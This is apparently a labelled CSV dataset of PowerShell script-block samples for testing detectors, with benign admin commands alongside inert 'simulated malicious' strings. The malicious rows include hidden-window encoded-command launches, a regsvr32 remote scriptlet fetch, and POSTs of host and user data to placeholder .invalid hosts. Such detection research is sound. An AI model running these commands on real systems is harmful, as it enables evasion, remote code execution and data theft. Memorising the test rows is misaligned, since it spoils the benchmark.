id,label,truth,class_id,dataset_group,scenario,behavior_family,evaluation_group,source_family,tactic,technique,mitre_attack_id,obfuscation_type,safety_class,lexical_input_source,scriptblock_event_id,scriptblock_event_sha256,analysis_text,lexical_score,lexical_reasons,wazuh_prediction,wazuh_alert_count,wazuh_rule_ids,wazuh_rule_levels,wazuh_max_rule_level,wazuh_rule_descriptions,feature_analysis_length,feature_line_count,feature_token_count,feature_special_char_count,feature_special_char_ratio,feature_digit_ratio,feature_whitespace_ratio,feature_entropy,feature_quoted_literal_count,feature_short_literal_count,feature_joined_literal_length,feature_base64_candidate_count,feature_longest_base64_candidate,feature_decoded_view_count,feature_backtick_count,feature_concat_operator_count,feature_join_operator_count,feature_format_operator_count,feature_char_cast_count,feature_suspicious_mixed_case_count,feature_suspicious_mixed_case_tokens,feature_execution_hit_count,feature_execution_hits,feature_raw_execution_hit_count,feature_recovered_execution_hit_count,feature_decoded_execution_hit_count,feature_download_hit_count,feature_download_hits,feature_raw_download_hit_count,feature_recovered_download_hit_count,feature_decoded_download_hit_count,feature_network_c2_hit_count,feature_network_c2_hits,feature_raw_network_c2_hit_count,feature_recovered_network_c2_hit_count,feature_decoded_network_c2_hit_count,feature_defense_evasion_hit_count,feature_defense_evasion_hits,feature_raw_defense_evasion_hit_count,feature_recovered_defense_evasion_hit_count,feature_decoded_defense_evasion_hit_count,feature_persistence_hit_count,feature_persistence_hits,feature_raw_persistence_hit_count,feature_recovered_persistence_hit_count,feature_decoded_persistence_hit_count,feature_credential_access_hit_count,feature_credential_access_hits,feature_raw_credential_access_hit_count,feature_recovered_credential_access_hit_count,feature_decoded_credential_access_hit_count,feature_lolbin_hit_count,feature_lolbin_hits,feature_raw_lolbin_hit_count,feature_recovered_lolbin_hit_count,feature_decoded_lolbin_hit_count,feature_collection_hit_count,feature_collection_hits,feature_raw_collection_hit_count,feature_recovered_collection_hit_count,feature_decoded_collection_hit_count,feature_remote_execution_hit_count,feature_remote_execution_hits,feature_raw_remote_execution_hit_count,feature_recovered_remote_execution_hit_count,feature_decoded_remote_execution_hit_count,feature_discovery_hit_count,feature_discovery_hits,feature_raw_discovery_hit_count,feature_recovered_discovery_hit_count,feature_decoded_discovery_hit_count,feature_indicator_category_count,feature_high_risk_category_count,feature_raw_indicator_hit_count,feature_indicator_hit_count,feature_recovered_indicator_hit_count,feature_decoded_indicator_hit_count,cv_fold,cv_threshold,lexical_prediction,deployment_threshold,lexical_prediction_full_fit,hybrid_or_prediction,hybrid_and_prediction,wazuh_level_3_prediction,wazuh_level_4_prediction,wazuh_level_5_prediction,wazuh_level_7_prediction,wazuh_level_10_prediction,wazuh_level_12_prediction
PST-079,benign,0,0,normal_benign,service_inventory_normal_v2,service_inventory_normal,benign:service_inventory_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,14fbaae1-e757-49fa-9a37-0d65be6c8032,87c20ba5de0185a46dbac856726cd9974dfbff347ae5fd8e23fc9d9b4263ef61,"Get-Service | Select-Object -First 8 Name, Status; Write-Output 'benign variant 2'",0,,0,0,,,0,,82,1,10,9,0.109756,0.02439,0.121951,4.411246,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,0,4,0,5,0,0,0,0,0,0,0,0,0
PST-080,simulated_malicious,1,1,obfuscated_indicator,encoded_command_backtick_literal,encoded_command,positive:encoded_command,Source-derived inert offensive behavior pattern,Execution,PowerShell,T1059.001,backtick_literal,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,b59cc80d-e3f1-4d2d-ba7c-c1fe6affc7e2,30f633510d9516918abbbd8616159953a138e3aeb85eb7511ab882cb2f5f9b4f,$indicator='powe`rshell.exe -NoProfile -Wi`ndowStyle Hi`dden -EncodedCommand Vw`ByAGk`AdABlAC0ATwB1AH`QAcAB1AHQ`AIAAnAF`QASABFAFMASQBTAC0ASQBOAEUAUgB`UAC`cA'; Write-Output $indicator,7,+2:category_execution;+1:base64_candidate;+1:backtick_obfuscation;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,182,1,19,21,0.115385,0.021978,0.038462,5.075978,1,0,144,1,29,1,10,0,0,0,0,1,AdABlAC0ATwB1AH,2,encodedcommand;windowstyle hidden,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0,3,4,1,5,1,1,0,0,0,0,0,0,0
PST-081,simulated_malicious,1,1,obfuscated_indicator,archive_collection_mixed_case,archive_collection,positive:archive_collection,Source-derived inert offensive behavior pattern,Collection,Archive Collected Data,T1560.001,mixed_case,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,7c97e40a-7568-4a63-a393-bad24d189416,eb8c24880e55278086131d2e2a4d834ebe3db2ded2e1a5001cf705dfd5ca37a4,$indicator='gET-chiLditEm ''$eNV:UseRpROfILe\documEnTS'' -REcURSE | ComPResS-arChIvE -DeSTInaTionpAtH ''$ENv:TemP\ColLecT.ziP'''; Write-Output $indicator,3,+1:category_collection;+1:category_discovery;+1:irregular_case,1,1,91816,4,4,Powershell script querying system environment variables,153,1,11,27,0.176471,0.0,0.052288,5.146674,1,0,111,0,0,0,0,0,0,0,0,5,ColLecT.ziP;ComPResS-arChIvE;DeSTInaTionpAtH;UseRpROfILe;gET-chiLditEm,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,collect.zip;compress-archive,2,0,0,0,,0,0,0,1,get-childitem,1,0,0,2,0,3,3,0,0,3,4,0,5,0,1,0,1,1,0,0,0,0
PST-082,benign,0,0,normal_benign,command_lookup_normal_v1,command_lookup_normal,benign:command_lookup_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,e7b697dd-4d18-4861-867c-3379d0f63aa1,9448083be6fdfd7c16a9b56c2361cc05b1436d3abd6578a4b42880224ea42742,"Get-Command Get-Process | Select-Object Name, CommandType, Source",3,+2:category_execution;+1:category_discovery,1,1,91815,4,4,Powershell executing process discovery,65,1,6,6,0.092308,0.0,0.092308,4.404544,0,0,0,0,0,0,0,0,0,0,0,0,,1,get-command,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,2,1,2,2,0,0,1,5,0,5,0,1,0,1,1,0,0,0,0
PST-083,simulated_malicious,1,1,obfuscated_indicator,powershell_remoting_combined_obfuscation,powershell_remoting,positive:powershell_remoting,Source-derived inert offensive behavior pattern,Lateral Movement,Windows Remote Management,T1021.006,combined_obfuscation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,78ea57c0-5d7d-4ae1-8acf-1aa9984cf8fb,bfc57128c8acecb614b3baf5414c17b95e00b06af022fd42ed4f30dbff56c060,"$parts=@('InVO`KE-Comm`A','nD -COMpu`T`ERnaMe',' ''hoST.exAmplE.INV','alid'' -sCri`PtB','lOck { pOWe`rSH','elL.ExE -NopRo`f','ilE -ENCODedCo','MMAnD vWbYAGKAD','ABLAC0AtWb1AHQ','AcAB1aHqAiaAnAFqasab','fAfMasqbtAc0A','SqBoAEuAuGBuaCCA',' }'); $indicator=($parts -join ''); Write-Output $indicator",13,+2:category_execution;+1:category_remote_execution;+2:multiple_high_risk_categories;+2:indicator_recovered_from_fragmentation;+1:backtick_obfuscation;+1:string_reconstruction;+1:fragmented_literals;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,295,1,31,76,0.257627,0.013559,0.047458,5.35555,14,10,190,0,0,1,7,0,1,0,0,5,ABLAC0AtWb1AHQ;AcAB1aHqAiaAnAFqasab;SqBoAEuAuGBuaCCA;fAfMasqbtAc0A;hoST.exAmplE.INV,2,encodedcommand;scriptblock,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,computername;invoke-command,1,1,0,0,,0,0,0,2,2,1,4,3,0,4,6,1,5,1,1,0,0,0,0,0,0,0
PST-084,benign,0,0,normal_benign,host_info_normal_v1,host_info_normal,benign:host_info_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,faf9d73d-1395-4e22-ab61-97b7852f4418,85046801dbd52de4a87436d5c9104bd31b9a4d72cf186ca1209af7233113f93e,Write-Host ('Host: ' + $env:COMPUTERNAME + '; User: ' + $env:USERNAME),2,+1:category_remote_execution;+1:string_reconstruction,1,1,91816,4,4,Powershell script querying system environment variables,70,1,7,17,0.242857,0.0,0.142857,4.600801,2,2,14,0,0,0,0,3,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0,3,4,0,5,0,1,0,1,1,0,0,0,0
PST-085,benign,0,0,hard_benign,hard_run_key_read_only_v1,hard_run_key_read_only,benign:hard_run_key_read_only,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,f5b2b900-58ca-4181-aaf1-4cee8ab0a90b,c060749ad0ca29e787d4203ddfbce73ac70d5a123ca0cdfe7de3868bfe117086,Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue | Select-Object -First 3 PSChildName,4,+2:category_persistence;+1:category_discovery;+1:irregular_case,0,0,,,0,,143,1,10,14,0.097902,0.006993,0.062937,4.882098,1,0,51,0,0,0,0,0,0,0,0,1,Get-ItemProperty,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,currentversion\run,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,1,0,0,2,1,2,2,0,0,3,4,1,5,0,1,0,0,0,0,0,0,0
PST-086,benign,0,0,normal_benign,profile_path_read_normal_v2,profile_path_read_normal,benign:profile_path_read_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,282b201f-4bd5-468a-9110-2d09f6210a20,c4b50078660f5f96ca8ee5e0fc08914e422188759dd11e0b81a532e453add49e,Write-Output $PROFILE; Write-Output 'benign variant 2',0,,0,0,,,0,,54,1,6,6,0.111111,0.018519,0.092593,4.342282,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-087,simulated_malicious,1,1,obfuscated_indicator,encoded_command_mixed_case,encoded_command,positive:encoded_command,Source-derived inert offensive behavior pattern,Execution,PowerShell,T1059.001,mixed_case,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,c0af7646-1be4-4588-bd4a-d5e867083e72,f07000e5d7289ac8c83977307c8e13e2a905d13d92ca7b24c87df7b351ff0dd2,$indicator='poWersHELL.Exe -NoProfIlE -wiNDOwStylE HidDeN -eNCOdEDComMAnD vWBYaGKAdABLAc0aTWb1aHqACaB1AhqaiAAnafQasAbfAFMAsqbtAC0asQBoaEuAUGbUacca'; Write-Output $indicator,6,+2:category_execution;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,172,1,9,11,0.063953,0.023256,0.040698,5.312058,1,0,134,1,72,1,0,0,0,0,0,5,HidDeN;NoProfIlE;eNCOdEDComMAnD;vWBYaGKAdABLAc0aTWb1aHqACaB1AhqaiAAnafQasAbfAFMAsqbtAC0asQBoaEuAUGbUacca;wiNDOwStylE,2,encodedcommand;windowstyle hidden,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0,3,4,1,5,1,1,0,0,0,0,0,0,0
PST-088,simulated_malicious,1,1,obfuscated_indicator,invoke_restmethod_post_alias_command_reconstruction,invoke_restmethod_post,positive:invoke_restmethod_post,Source-derived inert offensive behavior pattern,Exfiltration,Exfiltration Over C2 Channel,T1041,alias_command_reconstruction,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,cfc6f670-8b95-401f-a349-480f65c350bf,fa96ba0b2e6d11cde2c060cd803183963bd32de59cb451284eddfd51d3e1b1b4,"$parts=@('Invoke-Res','tMethod -Met','hod Post',' -Uri ''h','ttps://api.ex','ample.i','nvalid/','checkin'' -','Body @{h','ost=''WS-01'';use','r=''analyst'';','status=''ok''}'); $indicator=[string]::Concat($parts); Write-Output $indicator",12,+2:category_download;+2:category_network_c2;+2:multiple_high_risk_categories;+2:indicator_recovered_from_fragmentation;+1:string_reconstruction;+1:fragmented_literals;+2:combined_obfuscation,0,0,,,0,,237,1,29,88,0.371308,0.008439,0.037975,4.831956,12,12,122,0,0,0,0,0,1,0,0,0,,0,,0,0,0,1,invoke-restmethod,0,1,0,1,checkin,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,0,0,4,1,5,1,1,0,0,0,0,0,0,0
PST-089,benign,0,0,normal_benign,event_provider_normal_v1,event_provider_normal,benign:event_provider_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,aac006de-5f38-4aa2-a7aa-ce4834057510,89386904b70490ef5ca45632c78de7ba525fc88b0f1834e8921eba00b8702f38,"Get-WinEvent -ListProvider Microsoft-Windows-PowerShell | Select-Object Name, LogLinks",1,+1:irregular_case,0,0,,,0,,86,1,6,7,0.081395,0.0,0.069767,4.653675,0,0,0,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,2,3,0,5,0,0,0,0,0,0,0,0,0
PST-090,benign,0,0,hard_benign,hard_backtick_line_continuation_v2,hard_backtick_line_continuation,benign:hard_backtick_line_continuation,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,85dcb97b-0d7b-4d8f-a9b9-02c3609288c7,c2cb08c44c07057a6e26a9f3c2832ded26a8296f842d334ad0594e0dc353f9ba,"Get-Process `
| Select-Object -First 3 Name, Id; Write-Output 'hard benign variant 2'",0,+1:category_discovery;-1:discovery_only_correction,1,1,91815,4,4,Powershell executing process discovery,85,2,11,10,0.117647,0.023529,0.141176,4.69259,1,0,21,0,0,0,1,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0,2,3,0,5,0,1,0,1,1,0,0,0,0
PST-091,benign,0,0,normal_benign,culture_normal_v1,culture_normal,benign:culture_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,5e7d0f77-54b4-483e-9758-c324a54b8fc7,9c0a959db73e55a80df281cb660dc1b4dab0dde99eeeac48d736035884e9818a,"Get-Culture | Select-Object Name, DisplayName",0,,0,0,,,0,,45,1,4,4,0.088889,0.0,0.088889,4.266047,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,4,6,0,5,0,0,0,0,0,0,0,0,0
PST-092,benign,0,0,hard_benign,hard_localhost_url_string_v2,hard_localhost_url_string,benign:hard_localhost_url_string,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,15f109ec-c999-4f5c-98b0-012c6c83f87d,a9954d5eb294d26393bc68edb9c9f4d119a703f915bec9e0ccc62872454ef192,$url = 'http://localhost:8080/healthz?component=agent&format=text'; Write-Output $url; Write-Output 'hard benign variant 2',0,,0,0,,,0,,123,1,16,20,0.162602,0.04065,0.073171,4.724287,2,0,78,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,4,6,0,5,0,0,0,0,0,0,0,0,0
PST-093,benign,0,0,normal_benign,net_adapter_normal_v2,net_adapter_normal,benign:net_adapter_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,daed9f8a-50d8-45d2-a516-3d8f1154222c,feb9f01c958a8acaf93345ed2b3a5c031ecf00d8545749bf38b8f34925da378f,"Get-NetAdapter | Select-Object -First 5 Name, Status, MacAddress; Write-Output 'benign variant 2'",1,+1:irregular_case,0,0,,,0,,97,1,11,10,0.103093,0.020619,0.113402,4.533608,1,1,16,0,0,0,0,0,0,0,0,1,Get-NetAdapter,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,0,4,0,5,0,0,0,0,0,0,0,0,0
PST-094,simulated_malicious,1,1,obfuscated_indicator,invoke_restmethod_post_base64_literal_decode_safe,invoke_restmethod_post,positive:invoke_restmethod_post,Source-derived inert offensive behavior pattern,Exfiltration,Exfiltration Over C2 Channel,T1041,base64_literal_decode_safe,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,a58bf74f-7320-4d45-8ec1-7334bbeff2b5,104bae0389770468fdbd2983b90b34c67cf7e89f6d05f57f7292a47eaa046ae8,$encoded='SQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AYQBwAGkALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGMAaABlAGMAawBpAG4AJwAgAC0AQgBvAGQAeQAgAEAAewBoAG8AcwB0AD0AJwBXAFMALQAwADEAJwA7AHUAcwBlAHIAPQAnAGEAbgBhAGwAeQBzAHQAJwA7AHMAdABhAHQAdQBzAD0AJwBvAGsAJwB9AA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator,16,+2:category_download;+2:category_network_c2;+2:category_defense_evasion;+2:multiple_high_risk_categories;+2:indicator_recovered_from_base64;+2:indicator_recovered_from_fragmentation;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,450,1,10,27,0.06,0.037778,0.006667,4.924409,1,0,328,1,328,1,0,0,0,0,0,2,FromBase64String;SQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AYQBwAGkALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGMAaABlAGMAawBpAG4AJwAgAC0AQgBvAGQAeQAgAEAAewBoAG8AcwB0AD0AJwBXAFMALQAwADEAJwA7AHUAcwBlAHIAPQAnAGEAbgBhAGwAeQBzAHQAJwA7AHMAdABhAHQAdQBzAD0AJwBvAGsAJwB9AA,0,,0,0,0,1,invoke-restmethod,0,1,1,1,checkin,0,1,1,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,3,1,3,2,2,0,4,1,5,1,1,1,1,1,1,1,1,0
PST-095,benign,0,0,hard_benign,hard_json_processing_v2,hard_json_processing,benign:hard_json_processing,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,75b5eb4f-9592-4991-823d-eb4ae600ebe8,0bac0933518a588e93aa5b20eb383f46c876b6da1ba0c43261f289106ae1295d,"$json = '{""server"":""srv-file-01"",""mode"":""audit"",""enabled"":true}'; $json | ConvertFrom-Json | Select-Object server, mode; Write-Output 'hard benign variant 2'",1,+1:irregular_case,0,0,,,0,,157,1,17,34,0.216561,0.019108,0.089172,4.817907,2,0,75,0,0,0,0,0,0,0,0,1,ConvertFrom-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,1,5,0,5,0,0,0,0,0,0,0,0,0
PST-096,benign,0,0,hard_benign,hard_hash_multiple_strings_v1,hard_hash_multiple_strings,benign:hard_hash_multiple_strings,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,8fdaed40-a571-4fca-a952-ce0a53b89746,373aa9a3383a8df24bb0f676e7d7deaccd3e78f03294a558a2b987ceb8a6f789,"'alpha','beta','gamma' | ForEach-Object { Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($_))) } | Select-Object -First 2 Algorithm, Hash",1,+1:irregular_case,0,0,,,0,,171,1,16,37,0.216374,0.011696,0.076023,5.194864,3,3,14,0,0,0,0,0,0,0,0,2,ForEach-Object;Get-FileHash,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,2,3,0,5,0,0,0,0,0,0,0,0,0
PST-097,benign,0,0,normal_benign,string_measure_normal_v2,string_measure_normal,benign:string_measure_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,353cea9d-cd1e-420e-b85e-bbaba2ce6ae1,5d50b001cbe05864fcbbed25e73d053d3c1e512d81bba075aff4a36515a63e42,'routine maintenance script' | Measure-Object -Character; Write-Output 'benign variant 2',0,,0,0,,,0,,89,1,9,9,0.101124,0.011236,0.101124,4.264418,2,1,42,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,4,6,0,5,0,0,0,0,0,0,0,0,0
PST-098,benign,0,0,hard_benign,hard_concat_report_name_v2,hard_concat_report_name,benign:hard_concat_report_name,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,008ab309-01a8-4b29-8c09-7caee40d04c2,53e126a5aaf92f8b528a6cdaad57875bb4ef854fc1f7d7e98949efe1f16c5776,$name = ('weekly' + '-' + 'inventory' + '-' + 'report' + '-' + $env:COMPUTERNAME); Write-Output $name; Write-Output 'hard benign variant 2',5,+1:category_remote_execution;+1:string_reconstruction;+1:fragmented_literals;+2:combined_obfuscation,1,1,91816,4,4,Powershell script querying system environment variables,139,1,16,34,0.244604,0.007194,0.151079,4.656351,7,6,45,0,0,0,0,6,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0,2,3,1,5,1,1,1,1,1,0,0,0,0
PST-099,benign,0,0,hard_benign,hard_long_admin_string_v2,hard_long_admin_string,benign:hard_long_admin_string,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,9a5cbedc-706e-425d-ad72-3189b455bcba,882078ed8a24c8d16424b22a29e9f36256c3d63e889aa47df48c00218547baab,$note = ('administrative inventory and compliance audit ' * 18); Write-Output $note; Write-Output 'hard benign variant 2',0,,0,0,,,0,,121,1,14,14,0.115702,0.024793,0.132231,4.429826,2,0,67,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,2,3,0,5,0,0,0,0,0,0,0,0,0
PST-100,simulated_malicious,1,1,obfuscated_indicator,regsvr32_proxy_execution_string_concatenation,regsvr32_proxy_execution,positive:regsvr32_proxy_execution,Source-derived inert offensive behavior pattern,Defense Evasion,Regsvr32,T1218.010,string_concatenation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,ca5ee854-25d8-4f83-816e-e12bcc4a3be5,f48a95f4681a5e74b559780d5aae04916d3cce64033c77045b71ed6b42fb14bb,$indicator='regsvr32.e' + 'xe /s' + ' /n /u /i:' + 'https://re' + 'g.exam' + 'ple.in' + 'valid/a.' + 'sct s' + 'crobj.' + 'dll'; Write-Output $indicator,6,+2:category_lolbin;+1:string_reconstruction;+1:fragmented_literals;+2:combined_obfuscation,0,0,,,0,,152,1,19,48,0.315789,0.013158,0.164474,4.42482,10,10,69,0,0,0,0,9,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,regsvr32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,2,3,1,5,1,1,0,0,0,0,0,0,0
